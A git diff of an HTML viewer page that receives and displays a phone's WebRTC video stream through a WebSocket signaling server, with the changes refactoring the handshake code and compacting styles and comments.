+<!--&lt;!&ndash;        // Create PeerConnection&ndash;&gt;-->
 <!--&lt;!&ndash;        peerConnection = new RTCPeerConnection(config);&ndash;&gt;-->
 
-<!--&lt;!&ndash;        // Jab phone se video track aaye, toh video element mein set karein&ndash;&gt;-->
+<!--&lt;!&ndash;        // Handle incoming video stream&ndash;&gt;-->
 <!--&lt;!&ndash;        peerConnection.ontrack = (event) => {&ndash;&gt;-->
-<!--&lt;!&ndash;            console.log("Video Stream Received! 🎥 Starting playback...");&ndash;&gt;-->
+<!--&lt;!&ndash;            console.log("Video Stream Received! 🎥");&ndash;&gt;-->
 <!--&lt;!&ndash;            const remoteVideo = document.getElementById('remoteVideo');&ndash;&gt;-->
+
 <!--&lt;!&ndash;            if (remoteVideo.srcObject !== event.streams[0]) {&ndash;&gt;-->
 <!--&lt;!&ndash;                remoteVideo.srcObject = event.streams[0];&ndash;&gt;-->
 <!--&lt;!&ndash;                document.getElementById('liveBadge').style.visibility = "visible";&ndash;&gt;-->
-<!--&lt;!&ndash;                document.getElementById('statusMsg').innerText = "LIVE FEED ACTIVE 🟢";&ndash;&gt;-->
+<!--&lt;!&ndash;                updateStatus("LIVE FEED DECRYPTED 🟢", "#22c55e");&ndash;&gt;-->
 <!--&lt;!&ndash;            }&ndash;&gt;-->
 <!--&lt;!&ndash;        };&ndash;&gt;-->
 
-<!--&lt;!&ndash;        // Network candidates phone ko bhejein&ndash;&gt;-->
+<!--&lt;!&ndash;        // ICE Candidate handling&ndash;&gt;-->
 <!--&lt;!&ndash;        peerConnection.onicecandidate = (event) => {&ndash;&gt;-->
-<!--&lt;!&ndash;            if (event.candidate) {&ndash;&gt;-->
+<!--&lt;!&ndash;            if (event.candidate && socket.readyState === WebSocket.OPEN) {&ndash;&gt;-->
 <!--&lt;!&ndash;                socket.send(JSON.stringify({ type: 'candidate', candidate: event.candidate }));&ndash;&gt;-->
 <!--&lt;!&ndash;            }&ndash;&gt;-->
 <!--&lt;!&ndash;        };&ndash;&gt;-->
 
-<!--&lt;!&ndash;        // Connection State monitor karein&ndash;&gt;-->
+<!--&lt;!&ndash;        // Connection State Monitor&ndash;&gt;-->
 <!--&lt;!&ndash;        peerConnection.oniceconnectionstatechange = () => {&ndash;&gt;-->
-<!--&lt;!&ndash;            console.log("Connection Status:", peerConnection.iceConnectionState);&ndash;&gt;-->
-<!--&lt;!&ndash;            if (peerConnection.iceConnectionState === "disconnected") {&ndash;&gt;-->
-<!--&lt;!&ndash;                document.getElementById('statusMsg').innerText = "Phone Disconnected! 🔴";&ndash;&gt;-->
+<!--&lt;!&ndash;            console.log("ICE State:", peerConnection.iceConnectionState);&ndash;&gt;-->
+<!--&lt;!&ndash;            if (peerConnection.iceConnectionState === "disconnected" ||&ndash;&gt;-->
+<!--&lt;!&ndash;                peerConnection.iceConnectionState === "failed") {&ndash;&gt;-->
+<!--&lt;!&ndash;                updateStatus("Phone Signal Lost! 🔴", "#ef4444");&ndash;&gt;-->
 <!--&lt;!&ndash;                document.getElementById('liveBadge').style.visibility = "hidden";&ndash;&gt;-->
 <!--&lt;!&ndash;            }&ndash;&gt;-->
 <!--&lt;!&ndash;        };&ndash;&gt;-->
 
 <!--&lt;!&ndash;        try {&ndash;&gt;-->
-<!--&lt;!&ndash;            // Offer accept karein aur Answer generate karein&ndash;&gt;-->
+<!--&lt;!&ndash;            // WebRTC Handshake&ndash;&gt;-->
 <!--&lt;!&ndash;            await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));&ndash;&gt;-->
 <!--&lt;!&ndash;            const answer = await peerConnection.createAnswer();&ndash;&gt;-->
 <!--&lt;!&ndash;            await peerConnection.setLocalDescription(answer);&ndash;&gt;-->
 
-<!--&lt;!&ndash;            // Phone ko Answer bhej dein&ndash;&gt;-->
+<!--&lt;!&ndash;            // Send Answer back to phone&ndash;&gt;-->
 <!--&lt;!&ndash;            socket.send(JSON.stringify({&ndash;&gt;-->
 <!--&lt;!&ndash;                type: 'answer',&ndash;&gt;-->
 <!--&lt;!&ndash;                sdp: answer.sdp&ndash;&gt;-->
 <!--&lt;!&ndash;            }));&ndash;&gt;-->
-<!--&lt;!&ndash;            console.log("Answer sent to phone! 📤 Waiting for video...");&ndash;&gt;-->
+<!--&lt;!&ndash;            console.log("Answer sent. Negotiation Complete.");&ndash;&gt;-->
 <!--&lt;!&ndash;        } catch (e) {&ndash;&gt;-->
-<!--&lt;!&ndash;            console.error("WebRTC Handshake Error:", e);&ndash;&gt;-->
+<!--&lt;!&ndash;            console.error("WebRTC Error:", e);&ndash;&gt;-->
+<!--&lt;!&ndash;            updateStatus("Handshake Error! ⚠️", "#ef4444");&ndash;&gt;-->
 <!--&lt;!&ndash;        }&ndash;&gt;-->
 <!--&lt;!&ndash;    }&ndash;&gt;-->
 
-<!--&lt;!&ndash;    // Page load hote hi connect karein&ndash;&gt;-->
+<!--&lt;!&ndash;    // Initialize on page load&ndash;&gt;-->
 <!--&lt;!&ndash;    window.onload = connect;&ndash;&gt;-->
 <!--&lt;!&ndash;</script>&ndash;&gt;-->
 <!--&lt;!&ndash;</body>&ndash;&gt;-->
@@ -138,112 +377,27 @@
 <!--    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;700&display=swap" rel="stylesheet">-->
 
 <!--    <style>-->
-<!--        /* Reset & Full Screen */-->
 <!--        * { box-sizing: border-box; margin: 0; padding: 0; }-->
-
-<!--        body, html {-->
-<!--            width: 100%; height: 100%;-->
-<!--            background: #000;-->
-<!--            font-family: 'Space Grotesk', sans-serif;-->
-<!--            color: white;-->
-<!--            overflow: hidden;-->
-<!--        }-->
-
-<!--        /* -&#45;&#45; VIDEO MONITOR (EDGE TO EDGE) -&#45;&#45; */-->
-<!--        .monitor-box {-->
-<!--            position: fixed;-->
-<!--            top: 0; left: 0;-->
-<!--            width: 100vw;-->
-<!--            height: 100vh;-->
-<!--            background: #000;-->
-<!--            z-index: 1;-->
-<!--        }-->
-
-<!--        video {-->
-<!--            width: 100%;-->
-<!--            height: 100%;-->
-<!--            object-fit: cover; /* Laptop ki poori screen cover karega */-->
-<!--            filter: contrast(1.05) brightness(1.1);-->
-<!--            transition: opacity 1s ease;-->
-<!--        }-->
-
-<!--        /* -&#45;&#45; TOP HUD (Heads Up Display) -&#45;&#45; */-->
-<!--        .hud-top {-->
-<!--            position: absolute;-->
-<!--            top: 25px; left: 30px; right: 30px;-->
-<!--            display: flex; justify-content: space-between; align-items: center;-->
-<!--            z-index: 10;-->
-<!--            pointer-events: none;-->
-<!--        }-->
-
-<!--        .live-tag {-->
-<!--            background: #ef4444;-->
-<!--            padding: 8px 20px;-->
-<!--            border-radius: 4px;-->
-<!--            font-size: 11px;-->
-<!--            font-weight: 800;-->
-<!--            letter-spacing: 3px;-->
-<!--            visibility: hidden; /* Connection aane par dikhega */-->
-<!--            animation: blink 1.5s infinite;-->
-<!--            box-shadow: 0 0 25px rgba(239, 68, 68, 0.6);-->
-<!--            text-transform: uppercase;-->
-<!--        }-->
-
+<!--        body, html { width: 100%; height: 100%; background: #000; font-family: 'Space Grotesk', sans-serif; color: white; overflow: hidden; }-->
+<!--        .monitor-box { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #000; z-index: 1; }-->
+<!--        video { width: 100%; height: 100%; object-fit: cover; filter: contrast(1.05) brightness(1.1); transition: opacity 1s ease; }-->
+<!--        .hud-top { position: absolute; top: 25px; left: 30px; right: 30px; display: flex; justify-content: space-between; align-items: center; z-index: 10; pointer-events: none; }-->
+<!--        .live-tag { background: #ef4444; padding: 8px 20px; border-radius: 4px; font-size: 11px; font-weight: 800; letter-spacing: 3px; visibility: hidden; animation: blink 1.5s infinite; box-shadow: 0 0 25px rgba(239, 68, 68, 0.6); text-transform: uppercase; }-->
 <!--        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }-->
-
-<!--        .system-id {-->
-<!--            font-size: 10px;-->
-<!--            letter-spacing: 4px;-->
-<!--            color: rgba(255,255,255,0.4);-->
-<!--            text-transform: uppercase;-->
-<!--        }-->
-
-<!--        /* -&#45;&#45; DYNAMIC STATUS BAR (BOTTOM OVERLAY) -&#45;&#45; */-->
-<!--        .status-container {-->
-<!--            position: absolute;-->
-<!--            bottom: 40px;-->
-<!--            left: 50%;-->
-<!--            transform: translateX(-50%);-->
-<!--            z-index: 10;-->
-<!--            text-align: center;-->
-<!--            width: 100%;-->
-<!--        }-->
-
-<!--        .status-msg {-->
-<!--            display: inline-block;-->
-<!--            padding: 14px 40px;-->
-<!--            background: rgba(10, 10, 10, 0.8);-->
-<!--            backdrop-filter: blur(20px);-->
-<!--            border-radius: 100px;-->
-<!--            font-size: 13px;-->
-<!--            border: 1px solid rgba(255, 255, 255, 0.1);-->
-<!--            letter-spacing: 2px;-->
-<!--            box-shadow: 0 20px 50px rgba(0,0,0,0.8);-->
-<!--            color: #00f2fe; /* Cyber Cyan */-->
-<!--            text-transform: uppercase;-->
-<!--            font-weight: 500;-->
-<!--            transition: all 0.3s ease;-->
-<!--        }-->
-
-<!--        /* Cinematic Scanlines */-->
-<!--        .overlay-fx {-->
-<!--            position: absolute; top: 0; left: 0; width: 100%; height: 100%;-->
-<!--            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%);-->
-<!--            background-size: 100% 4px;-->
-<!--            z-index: 5; pointer-events: none; opacity: 0.2;-->
-<!--        }-->
+<!--        .system-id { font-size: 10px; letter-spacing: 4px; color: rgba(255,255,255,0.4); text-transform: uppercase; }-->
+<!--        .status-container { position: absolute; bottom: 40px; left: 50%; transform: translateX(-50%); z-index: 10; text-align: center; width: 100%; }-->
+<!--        .status-msg { display: inline-block; padding: 14px 40px; background: rgba(10, 10, 10, 0.8); backdrop-filter: blur(20px); border-radius: 100px; font-size: 13px; border: 1px solid rgba(255, 255, 255, 0.1); letter-spacing: 2px; box-shadow: 0 20px 50px rgba(0,0,0,0.8); color: #00f2fe; text-transform: uppercase; font-weight: 500; transition: all 0.3s ease; }-->
+<!--        .overlay-fx { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%); background-size: 100% 4px; z-index: 5; pointer-events: none; opacity: 0.2; }-->
 <!--    </style>-->
 <!--</head>-->
 <!--<body>-->
 
 <!--<div class="monitor-box">-->
 <!--    <div class="overlay-fx"></div>-->
-
 <!--    <div class="hud-top">-->
 <!--        <div id="liveBadge" class="live-tag">Live Feed Active</div>-->
 <!--        <div class="system-id">SecureStream // Admin_Portal_v3</div>-->
 <!--    </div>-->
-
 <!--    <video id="remoteVideo" autoplay playsinline muted></video>-->
 <!--</div>-->
 
@@ -255,7 +409,6 @@
 <!--    let peerConnection;-->
 <!--    let socket;-->
 
-<!--    // Google STUN Servers (Essential for NAT bypass)-->
 <!--    const config = {-->
 <!--        iceServers: [-->
 <!--            { urls: 'stun:stun.l.google.com:19302' },-->
@@ -268,43 +421,29 @@
 <!--        const msgBox = document.getElementById('statusMsg');-->
 <!--        msgBox.innerText = text;-->
 <!--        msgBox.style.color = color;-->
-<!--        msgBox.style.borderColor = color + "44"; // Adding transparency to border-->
 <!--    }-->
 
 <!--    function connect() {-->
-<!--        // Change this URL if your Render backend is different-->
 <!--        const wsUrl = "wss://camera-access.onrender.com/video-stream";-->
-<!--        console.log("Connecting to WebSocket...");-->
-
 <!--        socket = new WebSocket(wsUrl);-->
 
 <!--        socket.onopen = () => {-->
-<!--            console.log("Connected to Server ✅");-->
-<!--            updateStatus("Connected ✅ Waiting for Phone Signal...", "#00f2fe");-->
+<!--            updateStatus("Connected ✅ Waiting for Phone...", "#00f2fe");-->
 <!--        };-->
 
 <!--        socket.onmessage = async (event) => {-->
 <!--            const data = JSON.parse(event.data);-->
-<!--            console.log("Signal Received:", data.type);-->
-
 <!--            if (data.type === 'offer') {-->
-<!--                updateStatus("Offer detected. Handshaking...", "#a855f7"); // Purple for negotiation-->
+<!--                updateStatus("Offer detected. Handshaking...", "#a855f7");-->
 <!--                handleOffer(data);-->
 <!--            } else if (data.type === 'candidate' && peerConnection) {-->
 <!--                try {-->
 <!--                    await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));-->
-<!--                    console.log("ICE Candidate Synchronized ❄️");-->
-<!--                } catch (e) { console.error("Candidate Error:", e); }-->
+<!--                } catch (e) { console.error("ICE Error:", e); }-->
 <!--            }-->
 <!--        };-->
 
-<!--        socket.onerror = (error) => {-->
-<!--            console.error("Socket Error:", error);-->
-<!--            updateStatus("Network Error! ❌ Check Connection", "#ef4444");-->
-<!--        };-->
-
 <!--        socket.onclose = () => {-->
-<!--            console.log("Disconnected. Retrying...");-->
 <!--            updateStatus("Reconnecting to Secure Server...", "#facc15");-->
 <!--            document.getElementById('liveBadge').style.visibility = "hidden";-->
 <!--            setTimeout(connect, 3000);-->
@@ -312,109 +451,80 @@
 <!--    }-->
 
 <!--    async function handleOffer(offer) {-->
-<!--        // Create PeerConnection-->
+<!--        if (peerConnection) peerConnection.close();-->
 <!--        peerConnection = new RTCPeerConnection(config);-->
 
-<!--        // Handle incoming video stream-->
 <!--        peerConnection.ontrack = (event) => {-->
-<!--            console.log("Video Stream Received! 🎥");-->
 <!--            const remoteVideo = document.getElementById('remoteVideo');-->
-
-<!--            if (remoteVideo.srcObject !== event.streams[0]) {-->
+<!--            if (event.streams && event.streams[0]) {-->
 <!--                remoteVideo.srcObject = event.streams[0];-->
 <!--                document.getElementById('liveBadge').style.visibility = "visible";-->
 <!--                updateStatus("LIVE FEED DECRYPTED 🟢", "#22c55e");-->
 <!--            }-->
 <!--        };-->
 
-<!--        // ICE Candidate handling-->
 <!--        peerConnection.onicecandidate = (event) => {-->
 <!--            if (event.candidate && socket.readyState === WebSocket.OPEN) {-->
 <!--                socket.send(JSON.stringify({ type: 'candidate', candidate: event.candidate }));-->
 <!--            }-->
 <!--        };-->
 
-<!--        // Connection State Monitor-->
-<!--        peerConnection.oniceconnectionstatechange = () => {-->
-<!--            console.log("ICE State:", peerConnection.iceConnectionState);-->
-<!--            if (peerConnection.iceConnectionState === "disconnected" ||-->
-<!--                peerConnection.iceConnectionState === "failed") {-->
-<!--                updateStatus("Phone Signal Lost! 🔴", "#ef4444");-->
-<!--                document.getElementById('liveBadge').style.visibility = "hidden";-->
-<!--            }-->
-<!--        };-->
-
 <!--        try {-->
-<!--            // WebRTC Handshake-->
+<!--            // -&#45;&#45; FIXED: Compatibility Logic -&#45;&#45;-->
 <!--            await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));-->
+
 <!--            const answer = await peerConnection.createAnswer();-->
+
+<!--            // Software encoding support-->
 <!--            await peerConnection.setLocalDescription(answer);-->
 
-<!--            // Send Answer back to phone-->
 <!--            socket.send(JSON.stringify({-->
 <!--                type: 'answer',-->
-<!--                sdp: answer.sdp-->
+<!--                sdp: peerConnection.localDescription.sdp-->
 <!--            }));-->
-<!--            console.log("Answer sent. Negotiation Complete.");-->
+<!--            console.log("Answer sent successfully! ✅");-->
 <!--        } catch (e) {-->
-<!--            console.error("WebRTC Error:", e);-->
+<!--            console.error("Handshake Error:", e);-->
 <!--            updateStatus("Handshake Error! ⚠️", "#ef4444");-->
 <!--        }-->
 <!--    }-->
 
-<!--    // Initialize on page load-->
 <!--    window.onload = connect;-->
 <!--</script>-->
 <!--</body>-->
 <!--</html>-->
 <!DOCTYPE html>
-<html lang="en" xmlns:th="http://www.thymeleaf.org">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Admin Control | SecureStream Pro</title>
-
     <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;700&display=swap" rel="stylesheet">
-
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body, html { width: 100%; height: 100%; background: #000; font-family: 'Space Grotesk', sans-serif; color: white; overflow: hidden; }
         .monitor-box { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #000; z-index: 1; }
-        video { width: 100%; height: 100%; object-fit: cover; filter: contrast(1.05) brightness(1.1); transition: opacity 1s ease; }
-        .hud-top { position: absolute; top: 25px; left: 30px; right: 30px; display: flex; justify-content: space-between; align-items: center; z-index: 10; pointer-events: none; }
-        .live-tag { background: #ef4444; padding: 8px 20px; border-radius: 4px; font-size: 11px; font-weight: 800; letter-spacing: 3px; visibility: hidden; animation: blink 1.5s infinite; box-shadow: 0 0 25px rgba(239, 68, 68, 0.6); text-transform: uppercase; }
+        video { width: 100%; height: 100%; object-fit: cover; filter: contrast(1.05) brightness(1.1); }
+        .hud-top { position: absolute; top: 25px; left: 30px; right: 30px; display: flex; justify-content: space-between; z-index: 10; pointer-events: none; }
+        .live-tag { background: #ef4444; padding: 8px 20px; border-radius: 4px; font-size: 11px; font-weight: 800; visibility: hidden; animation: blink 1.5s infinite; }
         @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
-        .system-id { font-size: 10px; letter-spacing: 4px; color: rgba(255,255,255,0.4); text-transform: uppercase; }
-        .status-container { position: absolute; bottom: 40px; left: 50%; transform: translateX(-50%); z-index: 10; text-align: center; width: 100%; }
-        .status-msg { display: inline-block; padding: 14px 40px; background: rgba(10, 10, 10, 0.8); backdrop-filter: blur(20px); border-radius: 100px; font-size: 13px; border: 1px solid rgba(255, 255, 255, 0.1); letter-spacing: 2px; box-shadow: 0 20px 50px rgba(0,0,0,0.8); color: #00f2fe; text-transform: uppercase; font-weight: 500; transition: all 0.3s ease; }
-        .overlay-fx { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%); background-size: 100% 4px; z-index: 5; pointer-events: none; opacity: 0.2; }
+        .status-container { position: absolute; bottom: 40px; left: 50%; transform: translateX(-50%); z-index: 10; width: 100%; text-align: center; }
+        .status-msg { display: inline-block; padding: 14px 40px; background: rgba(10, 10, 10, 0.8); border-radius: 100px; font-size: 13px; border: 1px solid rgba(255, 255, 255, 0.1); color: #00f2fe; text-transform: uppercase; }
     </style>
 </head>
 <body>
-
 <div class="monitor-box">
-    <div class="overlay-fx"></div>
-    <div class="hud-top">
-        <div id="liveBadge" class="live-tag">Live Feed Active</div>
-        <div class="system-id">SecureStream // Admin_Portal_v3</div>
-    </div>
+    <div class="hud-top"><div id="liveBadge" class="live-tag">Live Feed Active</div></div>
     <video id="remoteVideo" autoplay playsinline muted></video>
 </div>
-
-<div class="status-container">
-    <div class="status-msg" id="statusMsg">Initializing secure connection...</div>
-</div>
+<div class="status-container"><div class="status-msg" id="statusMsg">Initializing...</div></div>
 
 <script>
     let peerConnection;
     let socket;
-
     const config = {
-        iceServers: [
-            { urls: 'stun:stun.l.google.com:19302' },
-            { urls: 'stun:stun1.l.google.com:19302' },
-            { urls: 'stun:stun2.l.google.com:19302' }
-        ]
+        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }, { urls: 'stun:stun1.l.google.com:19302' }],
+        sdpSemantics: 'unified-plan' // ✅ Force Unified Plan for mid matching
     };
 
     function updateStatus(text, color = "#00f2fe") {
@@ -424,28 +534,19 @@
     }
 
     function connect() {
-        const wsUrl = "wss://camera-access.onrender.com/video-stream";
-        socket = new WebSocket(wsUrl);
-
-        socket.onopen = () => {
-            updateStatus("Connected ✅ Waiting for Phone...", "#00f2fe");
-        };
-
+        socket = new WebSocket("wss://camera-access.onrender.com/video-stream");
+        socket.onopen = () => updateStatus("Connected ✅ Waiting for Phone...", "#00f2fe");
         socket.onmessage = async (event) => {
             const data = JSON.parse(event.data);
             if (data.type === 'offer') {
                 updateStatus("Offer detected. Handshaking...", "#a855f7");
                 handleOffer(data);
             } else if (data.type === 'candidate' && peerConnection) {
-                try {
-                    await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
-                } catch (e) { console.error("ICE Error:", e); }
+                try { await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate)); } catch (e) {}
             }
         };
-
         socket.onclose = () => {
-            updateStatus("Reconnecting to Secure Server...", "#facc15");
-            document.getElementById('liveBadge').style.visibility = "hidden";
+            updateStatus("Reconnecting...", "#facc15");
             setTimeout(connect, 3000);
         };
     }
@@ -459,36 +560,34 @@
             if (event.streams && event.streams[0]) {
                 remoteVideo.srcObject = event.streams[0];
                 document.getElementById('liveBadge').style.visibility = "visible";
-                updateStatus("LIVE FEED DECRYPTED 🟢", "#22c55e");
+                updateStatus("LIVE FEED ACTIVE 🟢", "#22c55e");
             }
         };
 
-        peerConnection.onicecandidate = (event) => {
-            if (event.candidate && socket.readyState === WebSocket.OPEN) {
-                socket.send(JSON.stringify({ type: 'candidate', candidate: event.candidate }));
-            }
+        peerConnection.onicecandidate = (e) => {
+            if (e.candidate) socket.send(JSON.stringify({ type: 'candidate', candidate: e.candidate }));
         };
 
         try {
-            // --- FIXED: Compatibility Logic ---
-            await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
+            // ✅ Fix: Set Remote Description with explicit object mapping
+            await peerConnection.setRemoteDescription(new RTCSessionDescription({
+                type: 'offer',
+                sdp: offer.sdp
+            }));
 
             const answer = await peerConnection.createAnswer();
-
-            // Software encoding support
             await peerConnection.setLocalDescription(answer);
 
             socket.send(JSON.stringify({
                 type: 'answer',
                 sdp: peerConnection.localDescription.sdp
             }));
-            console.log("Answer sent successfully! ✅");
+            console.log("Handshake successful! ✅");
         } catch (e) {
-            console.error("Handshake Error:", e);
-            updateStatus("Handshake Error! ⚠️", "#ef4444");
+            console.error("WebRTC Error:", e);
+            updateStatus("Handshake Error! Check Console", "#ef4444");
         }
     }
-
     window.onload = connect;
 </script>
 </body>
